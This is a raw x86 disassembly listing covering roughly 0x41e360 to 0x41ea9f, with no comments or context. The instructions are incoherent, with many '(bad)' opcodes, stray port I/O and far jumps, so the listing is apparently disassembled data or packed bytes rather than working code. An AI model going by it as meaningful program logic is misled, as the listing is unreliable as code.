  41e360:	imul   edx,DWORD PTR [edi],0x484fa47d
  41e366:	cmp    eax,0xb4484369
  41e36b:	mov    ebx,0x415fa6d5
  41e370:	sub    DWORD PTR [ebp-0x5ba9cb28],ebp
  41e376:	cld    
  41e377:	fimul  WORD PTR [edx-0x1c24256c]
  41e37d:	dec    edi
  41e37e:	fbstp  TBYTE PTR [esi-0x5f2396ac]
  41e384:	sahf   
  41e385:	jmp    0xf768285f
  41e38a:	xchg   edx,eax
  41e38b:	pop    edi
  41e38c:	addr16 mov eax,ds:0x30aa
  41e390:	repz jns 0x41e388
  41e393:	jmp    0x41e3ff
  41e395:	das    
  41e396:	fistp  QWORD PTR [ecx+0x2e2ba2ef]
  41e39c:	sub    BYTE PTR ds:0xe490794b,bh
  41e3a2:	pop    DWORD PTR [eax-0x25]
  41e3a5:	jmp    0x41e3e6
  41e3a7:	out    dx,al
  41e3a8:	push   ss
  41e3a9:	out    0x60,al
  41e3ab:	stc    
  41e3ac:	jae    0x41e367
  41e3ae:	out    0x83,eax
  41e3b0:	ins    BYTE PTR es:[edi],dx
  41e3b1:	xchg   edi,eax
  41e3b2:	mov    ch,0xda
  41e3b4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41e3b6:	and    al,0x3f
  41e3b8:	mov    BYTE PTR [ebp+0xd8e1003],bl
  41e3be:	xchg   ebp,eax
  41e3bf:	sub    eax,0xefd05b28
  41e3c4:	mov    bl,dh
  41e3c6:	push   esi
  41e3c7:	bound  ecx,QWORD PTR [ebx-0x5034b2b5]
  41e3cd:	xchg   DWORD PTR [edi-0x4e],edx
  41e3d0:	shr    BYTE PTR [ebx+0x15],0xdb
  41e3d4:	dec    cl
  41e3d6:	mov    ah,0xee
  41e3d8:	mov    bl,BYTE PTR [edi+0x5f8402ad]
  41e3de:	fdiv   QWORD PTR [esi+0x4d]
  41e3e1:	cmp    eax,0x5fa6e7f6
  41e3e6:	mov    cs,edi
  41e3e8:	inc    edi
  41e3e9:	sbb    DWORD PTR [edx],edx
  41e3eb:	mov    ebx,0xdc7d82a9
  41e3f0:	es inc ecx
  41e3f2:	add    DWORD PTR [ebp-0x6a],edx
  41e3f5:	pop    edi
  41e3f6:	mov    ch,0xdb
  41e3f8:	mov    dl,0xbc
  41e3fa:	lods   al,BYTE PTR ds:[esi]
  41e3fb:	adc    DWORD PTR [edi+edi*4],esi
  41e3fe:	cwde   
  41e3ff:	or     al,BYTE PTR [ebp+0x18248c40]
  41e405:	repz push ebp
  41e407:	mov    dh,0x2
  41e409:	in     al,dx
  41e40a:	in     al,dx
  41e40b:	xchg   ebx,eax
  41e40c:	out    0x47,al
  41e40e:	and    DWORD PTR [ebx],0x3f
  41e411:	and    al,0xb2
  41e413:	iret   
  41e414:	lods   eax,DWORD PTR ds:[esi]
  41e415:	jmp    0xf0b6:0x1407a1c1
  41e41c:	pop    ebp
  41e41d:	shr    bh,cl
  41e41f:	mov    WORD PTR [esi+0x66656],ss
  41e425:	push   esi
  41e426:	bound  ebp,QWORD PTR [eax+eax*4+0x40]
  41e42a:	mov    DWORD PTR [ecx],ebx
  41e42c:	clc    
  41e42d:	push   ebx
  41e42e:	mov    WORD PTR [edi+0x58e4ea24],gs
  41e434:	shl    BYTE PTR [esi],0x33
  41e437:	jg     0x41e4a5
  41e439:	(bad)  [edi]
  41e43b:	retf   
  41e43c:	or     eax,0x4acdf158
  41e441:	jle    0x41e414
  41e443:	xchg   ebx,eax
  41e444:	sbb    ebp,DWORD PTR [esi]
  41e446:	inc    esp
  41e447:	ja     0x41e443
  41e449:	jg     0x41e44c
  41e44b:	js     0x41e44f
  41e44d:	xlat   BYTE PTR ds:[ebx]
  41e44e:	out    0x61,al
  41e450:	add    DWORD PTR [ecx],edx
  41e452:	pusha  
  41e453:	lea    ecx,[ebx]
  41e455:	cli    
  41e456:	adc    ah,bh
  41e458:	or     al,0xa1
  41e45a:	imul   edx,DWORD PTR [ecx-0x57dd0385],0xaf4c3ecc
  41e464:	cmp    BYTE PTR ds:0x7dee58a4,cl
  41e46a:	add    eax,esp
  41e46c:	jne    0x41e46e
  41e46e:	in     al,dx
  41e46f:	cwde   
  41e470:	jmp    0x314d7275
  41e475:	sub    al,0x53
  41e477:	hlt    
  41e478:	jge    0x41e434
  41e47a:	push   esp
  41e47b:	add    al,0xfb
  41e47d:	pushf  
  41e47e:	(bad)  
  41e47f:	(bad)  
  41e481:	ds bswap esi
  41e484:	jge    0x41e42d
  41e486:	ss std 
  41e488:	rcl    DWORD PTR [esp+eax*2],1
  41e48b:	mov    gs,WORD PTR ds:0x38e7dbd9
  41e491:	mov    dh,0xad
  41e493:	sar    BYTE PTR [edi-0x80],cl
  41e496:	xchg   ebp,eax
  41e497:	ins    DWORD PTR es:[edi],dx
  41e498:	test   dh,al
  41e49a:	inc    ebp
  41e49b:	fsub   DWORD PTR [ebx+0x27]
  41e49e:	add    al,BYTE PTR [ecx-0x36bdfb90]
  41e4a4:	mov    ch,0xb5
  41e4a6:	int    0xba
  41e4a8:	jecxz  0x41e457
  41e4aa:	dec    edi
  41e4ab:	inc    ecx
  41e4ac:	push   0xffffffdf
  41e4ae:	loop   0x41e4bb
  41e4b0:	stc    
  41e4b1:	out    dx,eax
  41e4b2:	retf   0x5290
  41e4b5:	aaa    
  41e4b6:	scas   eax,DWORD PTR es:[edi]
  41e4b7:	xchg   edx,eax
  41e4b8:	outs   dx,DWORD PTR ds:[esi]
  41e4b9:	lods   eax,DWORD PTR ds:[esi]
  41e4ba:	retf   
  41e4bb:	pop    ds
  41e4bc:	xchg   ebp,eax
  41e4bd:	pop    es
  41e4be:	es cli 
  41e4c0:	cli    
  41e4c1:	xor    DWORD PTR [ecx],eax
  41e4c3:	rcl    DWORD PTR [esi+0x217d96cd],1
  41e4c9:	out    dx,al
  41e4ca:	cdq    
  41e4cb:	mov    bl,0x59
  41e4cd:	sbb    BYTE PTR [ebx],0x18
  41e4d0:	xor    cl,dh
  41e4d2:	inc    ebx
  41e4d3:	mov    ecx,ecx
  41e4d5:	push   ss
  41e4d6:	push   edx
  41e4d7:	mov    DWORD PTR [ecx],edi
  41e4d9:	ja     0x41e555
  41e4db:	dec    edi
  41e4dc:	fnsave [edx*4+0x3148e83d]
  41e4e3:	and    BYTE PTR [ebx-0xa76fa49],bl
  41e4e9:	das    
  41e4ea:	lods   al,BYTE PTR ds:[esi]
  41e4eb:	push   esi
  41e4ec:	cli    
  41e4ed:	lods   al,BYTE PTR ds:[esi]
  41e4ee:	(bad)  
  41e4ef:	pushf  
  41e4f0:	(bad)  
  41e4f1:	rol    BYTE PTR [esi-0x8],1
  41e4f4:	pop    edx
  41e4f5:	pushf  
  41e4f6:	int3   
  41e4f7:	mov    eax,0x7050fc47
  41e4fc:	shr    dh,0x66
  41e4ff:	or     BYTE PTR [edi],bh
  41e501:	xchg   edx,eax
  41e502:	scas   al,BYTE PTR es:[edi]
  41e503:	dec    eax
  41e504:	adc    eax,0x4e8c7873
  41e509:	in     al,dx
  41e50a:	in     eax,dx
  41e50b:	pop    ebp
  41e50c:	xor    esi,edx
  41e50e:	add    ah,BYTE PTR [ecx+ebx*2+0x651ab0af]
  41e515:	enter  0xa06f,0xc3
  41e519:	pop    edx
  41e51a:	inc    esp
  41e51b:	xchg   ebx,eax
  41e51c:	jae    0x41e4ab
  41e51e:	repz pop es
  41e520:	adc    al,dh
  41e522:	xchg   ecx,eax
  41e523:	enter  0xf079,0x0
  41e527:	ins    DWORD PTR es:[edi],dx
  41e528:	xor    BYTE PTR [edi-0x60],ch
  41e52b:	icebp  
  41e52c:	mov    bh,0x97
  41e52e:	adc    al,dl
  41e530:	fild   QWORD PTR [eax+ecx*2]
  41e533:	into   
  41e534:	pop    eax
  41e535:	pop    es
  41e536:	and    BYTE PTR [ebx-0x4fdb723],dh
  41e53c:	xchg   esi,eax
  41e53d:	mov    eax,ds:0xc6d1f046
  41e542:	bsr    eax,ecx
  41e545:	fimul  DWORD PTR [edx-0x11a8eb81]
  41e54b:	xchg   DWORD PTR [ecx-0x56a1605d],eax
  41e551:	test   al,0x4
  41e553:	mov    ecx,es
  41e555:	adc    al,0x15
  41e557:	out    dx,eax
  41e558:	cmc    
  41e559:	daa    
  41e55a:	fwait
  41e55b:	enter  0x94f5,0xa0
  41e55f:	push   esi
  41e560:	sti    
  41e561:	aaa    
  41e562:	ja     0x41e529
  41e564:	adc    esp,DWORD PTR [ecx+edx*2+0x31192ede]
  41e56b:	sbb    edi,edx
  41e56d:	adc    DWORD PTR [edx+0x2],edx
  41e570:	aad    0xa4
  41e572:	pusha  
  41e573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e574:	js     0x41e52d
  41e576:	ins    DWORD PTR es:[edi],dx
  41e577:	sahf   
  41e578:	sub    eax,0x94a44684
  41e57d:	or     ch,BYTE PTR [ebx+0x62c33391]
  41e583:	dec    BYTE PTR [ecx+0x3c70a7c7]
  41e589:	ret    
  41e58a:	adc    al,0xbe
  41e58c:	imul   ecx,edi,0xfffffff1
  41e58f:	out    dx,al
  41e590:	fs jecxz 0x41e5d9
  41e593:	ja     0x41e609
  41e595:	lea    esi,[edx]
  41e597:	jle    0x41e528
  41e599:	mov    ds:0xbda0175c,eax
  41e59e:	ret    0x6102
  41e5a1:	jne    0x41e55a
  41e5a3:	pop    edx
  41e5a4:	push   ss
  41e5a5:	push   esi
  41e5a6:	out    dx,al
  41e5a7:	loop   0x41e5a8
  41e5a9:	ins    BYTE PTR es:[edi],dx
  41e5aa:	int3   
  41e5ab:	lds    esp,FWORD PTR [ebp+eax*2+0x18]
  41e5af:	xchg   ecx,ebx
  41e5b1:	daa    
  41e5b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5b3:	inc    edi
  41e5b4:	je     0x41e53c
  41e5b6:	mov    edi,0xd41138ef
  41e5bb:	inc    BYTE PTR [ecx-0x20856dbb]
  41e5c1:	sub    eax,DWORD PTR [ebx-0x740d73da]
  41e5c7:	loop   0x41e5cb
  41e5c9:	push   esp
  41e5ca:	int    0xf4
  41e5cc:	(bad)  
  41e5cd:	jmp    0x2401:0x280b6e22
  41e5d4:	jmp    0x41e5b8
  41e5d6:	hlt    
  41e5d7:	pop    eax
  41e5d8:	jl     0x41e5e9
  41e5da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5db:	xchg   esi,eax
  41e5dc:	dec    eax
  41e5dd:	pop    ebx
  41e5de:	xor    eax,0x922e178a
  41e5e3:	(bad)  
  41e5e4:	cli    
  41e5e5:	jnp    0x41e617
  41e5e7:	sbb    al,BYTE PTR [edx-0x3b]
  41e5ea:	call   0x83d8:0x7f7f6f1f
  41e5f1:	popa   
  41e5f2:	jp     0x41e672
  41e5f4:	sbb    al,0xf1
  41e5f6:	jl     0x41e66a
  41e5f8:	pushf  
  41e5f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5fa:	add    ah,BYTE PTR [edi-0x64]
  41e5fd:	lods   eax,DWORD PTR ds:[esi]
  41e5fe:	in     al,0xd3
  41e600:	add    bh,BYTE PTR [eax+0x16]
  41e603:	jg     0x41e5d3
  41e605:	enter  0xc882,0xc6
  41e609:	xchg   edi,eax
  41e60a:	jns    0x41e682
  41e60c:	mov    al,0x78
  41e60e:	retf   
  41e60f:	adc    DWORD PTR [eax+0x4ed10f79],ecx
  41e615:	push   ebp
  41e616:	xchg   ecx,eax
  41e617:	rcr    DWORD PTR [ebx-0x25],0x90
  41e61b:	mov    bh,0xb6
  41e61d:	cmp    bl,BYTE PTR [edi]
  41e61f:	popa   
  41e620:	out    dx,al
  41e621:	fistp  QWORD PTR [ebp-0x20979a16]
  41e627:	push   ds
  41e628:	scas   al,BYTE PTR es:[edi]
  41e629:	lods   al,BYTE PTR ds:[esi]
  41e62a:	cs cmp cl,dl
  41e62d:	xchg   esi,eax
  41e62e:	mul    DWORD PTR [edx+0x3fba7037]
  41e634:	fstp   TBYTE PTR [edi]
  41e636:	mov    ecx,0x65c8f75a
  41e63b:	xor    eax,0x3431f52c
  41e640:	sbb    al,0xcc
  41e642:	fsubr  QWORD PTR [edx+0x2f]
  41e645:	int3   
  41e646:	lods   eax,DWORD PTR ds:[esi]
  41e647:	and    ah,BYTE PTR [ecx]
  41e649:	(bad)  
  41e64a:	(bad)  
  41e64c:	scas   al,BYTE PTR es:[edi]
  41e64d:	jbe    0x41e606
  41e64f:	push   0x96172ae4
  41e654:	xchg   edi,eax
  41e655:	and    BYTE PTR [esi-0x25],0x77
  41e659:	add    dl,al
  41e65b:	add    edx,DWORD PTR [edx-0x73]
  41e65e:	aaa    
  41e65f:	xchg   esi,eax
  41e660:	xchg   esi,eax
  41e661:	aas    
  41e662:	out    0x85,al
  41e664:	dec    ebx
  41e665:	mov    esi,0x2624b6a1
  41e66a:	mov    ebp,0x45df1a35
  41e66f:	fwait
  41e670:	setb   BYTE PTR [esi+0x2b806be3]
  41e677:	sahf   
  41e678:	sbb    edx,ebp
  41e67a:	and    DWORD PTR [esi+0x4aa60af0],esi
  41e680:	ja     0x41e673
  41e682:	in     eax,dx
  41e683:	sub    DWORD PTR [ebx-0x30e9a9fb],ebp
  41e689:	lock inc edi
  41e68b:	pop    eax
  41e68c:	aaa    
  41e68d:	(bad)  
  41e68e:	jae    0x41e672
  41e690:	inc    edx
  41e691:	pop    es
  41e692:	or     bh,BYTE PTR ds:0x59c0245b
  41e698:	repz dec ebx
  41e69a:	js     0x41e6f6
  41e69c:	sbb    esp,DWORD PTR [esi-0x70]
  41e69f:	ss xor eax,0x426342fe
  41e6a5:	nop
  41e6a6:	sub    DWORD PTR [ebp+0xbe5fa5d],0x31e5daf
  41e6b0:	popa   
  41e6b1:	je     0x41e6b3
  41e6b3:	pop    ebp
  41e6b4:	stc    
  41e6b5:	dec    esp
  41e6b6:	leave  
  41e6b7:	cs push ebp
  41e6b9:	sub    esi,edx
  41e6bb:	jb     0x41e6a4
  41e6bd:	adc    DWORD PTR [ebx],ecx
  41e6bf:	nop
  41e6c0:	mov    gs,ebx
  41e6c2:	add    eax,0xa44ecfed
  41e6c7:	pop    eax
  41e6c8:	(bad)  
  41e6c9:	jg     0x41e684
  41e6cb:	adc    eax,0x1a9441f3
  41e6d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6d1:	cmp    dl,BYTE PTR [eax-0x24]
  41e6d4:	jmp    0x41e750
  41e6d6:	(bad)  
  41e6d7:	jmp    0x41e730
  41e6d9:	arpl   WORD PTR [esi+eiz*2+0x7486ed7b],bx
  41e6e0:	push   es
  41e6e1:	jno    0x41e755
  41e6e3:	jb     0x41e6b1
  41e6e5:	cmp    ebx,DWORD PTR [esi-0x11542035]
  41e6eb:	sbb    dh,0x16
  41e6ee:	inc    esi
  41e6ef:	adc    ebp,eax
  41e6f1:	xchg   BYTE PTR [ecx+0x4cfbf47b],al
  41e6f7:	arpl   WORD PTR [edx+edi*2-0x12fdd3fa],sp
  41e6fe:	mov    ebp,DWORD PTR [esi+0xa]
  41e701:	retf   
  41e702:	jbe    0x41e6ba
  41e704:	ror    DWORD PTR [ebx+edx*8-0x15aea7d1],1
  41e70b:	lock imul edi,DWORD PTR [ebp+edi*4+0x72],0x4d
  41e711:	inc    esp
  41e712:	pop    ebx
  41e713:	push   eax
  41e714:	mov    esi,0x4f9f75d5
  41e719:	dec    esi
  41e71a:	pop    esp
  41e71b:	xor    eax,0x61f5aad3
  41e720:	inc    esp
  41e721:	retf   0xaa6f
  41e724:	xlat   BYTE PTR ds:[ebx]
  41e725:	mov    al,ds:0xe81f43ad
  41e72a:	inc    esp
  41e72b:	dec    ebx
  41e72c:	pushf  
  41e72d:	shr    DWORD PTR [ebp-0x63],cl
  41e730:	inc    ebp
  41e731:	cli    
  41e732:	mov    edi,0xd4213591
  41e737:	sub    esp,DWORD PTR [eax-0x29]
  41e73a:	hlt    
  41e73b:	dec    ebx
  41e73c:	stc    
  41e73d:	add    ebp,ecx
  41e73f:	push   ebp
  41e740:	push   0x7988718b
  41e745:	xor    eax,0x30d1a193
  41e74a:	add    al,0x4e
  41e74c:	pop    ecx
  41e74d:	jg     0x41e711
  41e74f:	jns    0x41e72a
  41e751:	sar    BYTE PTR [ecx],0x9
  41e754:	xor    eax,0x4f41406
  41e759:	dec    esp
  41e75a:	mov    dl,0x28
  41e75c:	cmc    
  41e75d:	push   cs
  41e75e:	cwde   
  41e75f:	inc    DWORD PTR [eax-0x62a3fc53]
  41e765:	mov    al,ds:0xbedfb4ec
  41e76a:	inc    eax
  41e76b:	jo     0x41e72c
  41e76d:	repnz bound esp,QWORD PTR [eax]
  41e770:	sbb    eax,DWORD PTR [edx]
  41e772:	dec    edx
  41e774:	sti    
  41e775:	dec    eax
  41e776:	adc    BYTE PTR [ebx-0x21],dh
  41e779:	js     0x41e76d
  41e77b:	les    edi,FWORD PTR ds:0xac7c903f
  41e781:	sbb    esp,DWORD PTR [ecx]
  41e783:	je     0x41e7db
  41e785:	out    dx,al
  41e786:	fcomp  QWORD PTR [eax-0x77effb59]
  41e78c:	adc    bh,BYTE PTR [eax+0x66]
  41e78f:	mov    DWORD PTR [ecx],0x41978207
  41e795:	add    eax,0x6d7dfc57
  41e79a:	(bad)  
  41e79b:	fisub  WORD PTR [edx+0x580ad169]
  41e7a1:	daa    
  41e7a2:	mov    bl,0x1a
  41e7a4:	or     DWORD PTR [eax-0x573c3e50],eax
  41e7aa:	ficomp DWORD PTR [edi+0x36826a57]
  41e7b0:	push   eax
  41e7b1:	add    esi,DWORD PTR [eax+0x6d]
  41e7b4:	dec    eax
  41e7b5:	repnz fcom QWORD PTR [eax]
  41e7b8:	sbb    esp,DWORD PTR [ebx]
  41e7ba:	pop    eax
  41e7bb:	xor    bl,bl
  41e7bd:	outs   dx,BYTE PTR ds:[esi]
  41e7be:	cmp    eax,DWORD PTR [edi]
  41e7c0:	pop    ebp
  41e7c1:	pop    ds
  41e7c2:	mov    al,ds:0xc5d80689
  41e7c7:	adc    DWORD PTR [ebp-0x2],ebp
  41e7ca:	(bad)  
  41e7cc:	inc    ebp
  41e7cd:	int3   
  41e7ce:	std    
  41e7cf:	iret   
  41e7d0:	je     0x41e798
  41e7d2:	push   sp
  41e7d4:	(bad)  
  41e7d5:	jmp    0x148a6424
  41e7da:	push   edx
  41e7db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7dc:	sar    BYTE PTR [ebx],0xd0
  41e7df:	outs   dx,BYTE PTR ds:[esi]
  41e7e0:	mov    cl,0x80
  41e7e2:	jbe    0x41e84b
  41e7e4:	jae    0x41e85e
  41e7e6:	inc    ebp
  41e7e7:	xchg   ecx,eax
  41e7e8:	mov    al,ds:0xd0fe41f5
  41e7ed:	fs scas al,BYTE PTR es:[edi]
  41e7ef:	outs   dx,BYTE PTR ds:[esi]
  41e7f0:	bound  ebp,QWORD PTR [edi+0x18]
  41e7f3:	push   ss
  41e7f4:	je     0x41e870
  41e7f6:	ja     0x41e7a9
  41e7f8:	test   eax,0x782c76b4
  41e7fd:	push   ss
  41e7fe:	mov    eax,0xd01839f5
  41e803:	shr    BYTE PTR [eax-0x5c17dff5],0xd0
  41e80a:	mov    bl,0xe1
  41e80c:	icebp  
  41e80d:	add    al,0xa5
  41e80f:	arpl   WORD PTR ss:[eax-0x32],cx
  41e813:	stos   BYTE PTR es:[edi],al
  41e814:	(bad)  
  41e815:	pusha  
  41e816:	xor    al,0x96
  41e818:	shl    ah,0xf3
  41e81b:	mov    ebp,0xfc960385
  41e820:	(bad)  
  41e821:	pop    esp
  41e822:	xor    BYTE PTR [edi+ebx*8],dh
  41e825:	cmp    dh,dh
  41e827:	dec    ebp
  41e828:	jns    0x41e804
  41e82a:	push   edx
  41e82b:	xchg   ebx,eax
  41e82c:	cmp    al,0xc4
  41e82e:	push   cs
  41e82f:	cdq    
  41e830:	mov    ebx,0xcc98bfc0
  41e835:	adc    ebx,edx
  41e837:	add    al,0x98
  41e839:	cmp    esp,ebp
  41e83b:	(bad)  
  41e83c:	jmp    0xd1e3:0xb34f6310
  41e843:	mov    bh,0xfa
  41e845:	lods   al,BYTE PTR ds:[esi]
  41e846:	xor    bl,BYTE PTR [eax-0x520e2173]
  41e84c:	sub    al,0xb9
  41e84e:	push   ss
  41e84f:	adc    DWORD PTR [edi],0x4d4e96be
  41e855:	out    dx,ax
  41e857:	jp     0x41e8bb
  41e859:	jge    0x41e85c
  41e85b:	mov    edx,0x347fde95
  41e860:	std    
  41e861:	pop    ebp
  41e862:	or     ah,BYTE PTR [eax]
  41e864:	adc    eax,0xb82f1b1b
  41e869:	xor    edx,DWORD PTR [ecx+0x9dfca24]
  41e86f:	mov    ecx,0xd6621c56
  41e874:	mov    WORD PTR [edx],?
  41e876:	ret    0xe1f6
  41e879:	jb     0x41e8d7
  41e87b:	neg    DWORD PTR ds:0x364241e3
  41e881:	pop    DWORD PTR [esi]
  41e883:	mov    esi,0xda9ebebc
  41e888:	scas   al,BYTE PTR es:[edi]
  41e889:	cmp    BYTE PTR [eax+ebp*2-0x14],0x6f
  41e88e:	lods   eax,DWORD PTR ds:[esi]
  41e88f:	or     ebp,DWORD PTR fs:[ebx+ecx*4]
  41e893:	in     al,dx
  41e894:	bound  esi,QWORD PTR [ebx]
  41e896:	mov    ds:0xe9180b7d,eax
  41e89b:	pop    ebx
  41e89c:	into   
  41e89d:	inc    esp
  41e89e:	lds    esi,FWORD PTR [edx]
  41e8a0:	xor    eax,0x63a298e7
  41e8a5:	jns    0x41e873
  41e8a7:	test   al,0x4a
  41e8a9:	fldcw  WORD PTR [ebp-0x19]
  41e8ac:	repnz cdq 
  41e8ae:	xchg   BYTE PTR [esi-0x21454224],cl
  41e8b4:	js     0x41e8fc
  41e8b6:	sar    BYTE PTR [eax],0x5a
  41e8b9:	xchg   BYTE PTR [eax-0xe],cl
  41e8bc:	dec    ecx
  41e8bd:	dec    edx
  41e8be:	mov    al,ds:0xf6418399
  41e8c3:	jne    0x41e8e4
  41e8c5:	cmp    dh,ch
  41e8c7:	adc    eax,0x1323a8a2
  41e8cc:	sar    eax,cl
  41e8ce:	dec    esi
  41e8cf:	jmp    0x41e941
  41e8d1:	cmc    
  41e8d2:	push   0xb6d99b6a
  41e8d7:	dec    eax
  41e8d8:	out    0x43,al
  41e8da:	jg     0x41e924
  41e8dc:	clc    
  41e8dd:	addr16 xchg ebx,eax
  41e8df:	dec    ebx
  41e8e0:	add    esi,DWORD PTR [edx]
  41e8e2:	mov    es,WORD PTR [ebx+0x2ad8681f]
  41e8e8:	test   eax,0xa622452f
  41e8ed:	mov    al,0x23
  41e8ef:	aaa    
  41e8f0:	popf   
  41e8f1:	xchg   ecx,eax
  41e8f2:	stos   DWORD PTR es:[edi],eax
  41e8f3:	push   0xda5410ca
  41e8f8:	retf   
  41e8f9:	cli    
  41e8fa:	mov    edx,0xa3ef60d3
  41e8ff:	repz push ss
  41e901:	mov    esp,DWORD PTR [edi]
  41e903:	xor    eax,0x796fefd2
  41e908:	or     DWORD PTR [esi+0x1e],esp
  41e90b:	or     bh,dl
  41e90d:	or     bl,BYTE PTR [ebx-0x2d]
  41e910:	cmp    eax,0x2618364a
  41e915:	mov    dl,0x6d
  41e917:	mov    esi,0x561162c9
  41e91c:	aad    0x8b
  41e91e:	ss ss add eax,0x35eddc5
  41e925:	lods   eax,DWORD PTR ds:[esi]
  41e926:	and    eax,0x91c6a86
  41e92b:	xchg   ebp,eax
  41e92c:	imul   edx,DWORD PTR [ebp+0x7b],0x9
  41e930:	xchg   DWORD PTR [edi+ebx*2-0x2],ecx
  41e934:	out    0x24,al
  41e936:	test   al,0x5d
  41e938:	cli    
  41e939:	xchg   BYTE PTR [ebp+ebp*4-0x4264ceb9],ah
  41e940:	sahf   
  41e941:	pop    ds
  41e942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e943:	sbb    eax,0x424e05a5
  41e948:	(bad)  
  41e949:	xor    edx,DWORD PTR [edx]
  41e94b:	inc    esi
  41e94c:	jg     0x41e94d
  41e94e:	daa    
  41e94f:	xor    al,0x5d
  41e951:	fst    DWORD PTR [ecx+0x10c44fc9]
  41e957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e959:	mov    dl,0xaa
  41e95b:	sub    al,BYTE PTR [eax]
  41e95d:	push   edx
  41e95e:	xchg   ebx,eax
  41e95f:	pop    ebx
  41e960:	xchg   esp,eax
  41e961:	ins    BYTE PTR es:[edi],dx
  41e962:	(bad)  
  41e963:	(bad)  
  41e964:	sbb    ax,0xdb8c
  41e968:	xchg   BYTE PTR [ecx-0x32],bh
  41e96b:	(bad)  
  41e96c:	pop    ecx
  41e96d:	mov    ds:0xcfc33823,eax
  41e972:	and    DWORD PTR [esi-0x2f],ebx
  41e975:	mov    ebx,cs
  41e977:	(bad)  
  41e978:	mov    BYTE PTR [ebp-0x7c],cl
  41e97b:	jo     0x41e9b2
  41e97d:	adc    ecx,esp
  41e97f:	dec    edi
  41e980:	mov    eax,ds:0xd161b9aa
  41e985:	xor    BYTE PTR [ebp-0x2bb10d58],bh
  41e98b:	int    0x96
  41e98d:	fild   DWORD PTR [edi-0xd]
  41e990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e991:	scas   eax,DWORD PTR es:[edi]
  41e992:	sub    DWORD PTR [ebp-0x64],ebp
  41e995:	imul   DWORD PTR [ecx+0x4b]
  41e998:	inc    ecx
  41e999:	inc    ebp
  41e99a:	lea    ebx,[edi]
  41e99c:	add    eax,0x7de5fa13
  41e9a1:	test   ebx,ebp
  41e9a3:	nop
  41e9a4:	frstor [ecx]
  41e9a6:	inc    ebx
  41e9a7:	lock adc al,0xc1
  41e9aa:	shr    DWORD PTR [ebp+0x42],0x71
  41e9ae:	stos   BYTE PTR es:[edi],al
  41e9af:	mul    DWORD PTR [ebp-0x64]
  41e9b2:	(bad)  
  41e9b3:	sbb    ch,bh
  41e9b5:	inc    eax
  41e9b6:	pop    es
  41e9b7:	push   eax
  41e9b8:	and    bh,BYTE PTR [edi+0x207d3adf]
  41e9be:	push   ds
  41e9bf:	sbb    ebx,ecx
  41e9c1:	xchg   ebx,eax
  41e9c2:	push   ds
  41e9c3:	enter  0x7a2,0x6d
  41e9c7:	or     al,0x9d
  41e9c9:	fwait
  41e9ca:	and    eax,DWORD PTR [esi+0xeb8069a]
  41e9d0:	push   cs
  41e9d1:	sub    BYTE PTR [ecx+0x368d8dbe],ah
  41e9d7:	push   eax
  41e9d8:	pop    esp
  41e9d9:	jle    0x41ea2a
  41e9db:	pop    ecx
  41e9dc:	mov    bl,0xa7
  41e9de:	jmp    0x60943773
  41e9e3:	popf   
  41e9e4:	cmp    al,0xfe
  41e9e6:	adc    BYTE PTR [ebp+0x7f7a896c],dh
  41e9ec:	sub    ebp,esi
  41e9ee:	mov    ecx,0x59e19314
  41e9f3:	adc    DWORD PTR [edi+eiz*2],ecx
  41e9f6:	(bad)  
  41e9f7:	and    DWORD PTR [eax-0x76],edx
  41e9fa:	scas   eax,DWORD PTR es:[edi]
  41e9fb:	pop    eax
  41e9fc:	fst    QWORD PTR [ecx+0x47ab49c5]
  41ea02:	fmul   QWORD PTR [eax+0x218bb841]
  41ea08:	inc    edx
  41ea09:	sahf   
  41ea0a:	jns    0x41ea6f
  41ea0c:	jb     0x41ea00
  41ea0e:	push   ecx
  41ea0f:	test   al,0x63
  41ea11:	lahf   
  41ea12:	popa   
  41ea13:	add    BYTE PTR [edi],0x94
  41ea16:	xchg   esi,eax
  41ea17:	pop    es
  41ea18:	popa   
  41ea19:	push   es
  41ea1a:	lea    eax,[esi]
  41ea1c:	cwde   
  41ea1d:	jno    0x41ea75
  41ea1f:	mov    ds:0x21c1f1c2,eax
  41ea24:	push   esi
  41ea25:	(bad)  
  41ea26:	push   bp
  41ea28:	in     eax,0x27
  41ea2a:	in     eax,dx
  41ea2b:	addr16 mov eax,ds:0x9b67
  41ea30:	mov    eax,0xdbbd32dc
  41ea35:	in     al,0x46
  41ea37:	shr    edi,1
  41ea39:	das    
  41ea3a:	xor    esp,esp
  41ea3c:	mov    esp,0xb6bf1d0a
  41ea41:	outs   dx,BYTE PTR ds:[esi]
  41ea42:	int    0x88
  41ea44:	lahf   
  41ea45:	jge    0x41e9cf
  41ea47:	jle    0x41eac7
  41ea49:	push   esi
  41ea4a:	and    BYTE PTR [eax-0x243478f7],0xf6
  41ea51:	sahf   
  41ea52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea53:	pop    esp
  41ea54:	jmp    0x8177:0x5bd6f605
  41ea5b:	adc    al,0xe5
  41ea5d:	arpl   bx,di
  41ea5f:	xchg   BYTE PTR [eax+eax*8+0x10e24756],al
  41ea66:	push   0xffffffc1
  41ea68:	jb     0x41ea8e
  41ea6a:	cmp    ah,BYTE PTR [esi+esi*2-0x4c]
  41ea6e:	jl     0x41ea10
  41ea70:	test   al,0x8a
  41ea72:	cmp    eax,0x9382d2f3
  41ea77:	dec    edi
  41ea78:	scas   al,BYTE PTR es:[edi]
  41ea79:	sbb    BYTE PTR [edx+0x3042bb2d],cl
  41ea7f:	je     0x41ea12
  41ea81:	sub    BYTE PTR [ebp+0x7e41d0a0],ch
  41ea87:	stos   DWORD PTR es:[edi],eax
  41ea88:	out    dx,eax
  41ea89:	aad    0x30
  41ea8b:	add    DWORD PTR [eax],eax
  41ea8d:	fwait
  41ea8e:	mov    al,ds:0x165085bf
  41ea93:	or     esp,DWORD PTR [ecx+0x46]
  41ea96:	pop    edi
  41ea97:	mov    al,0x6d
  41ea99:	fistp  DWORD PTR [eax-0x44122532]
  41ea9f:	adc    al,0x9a
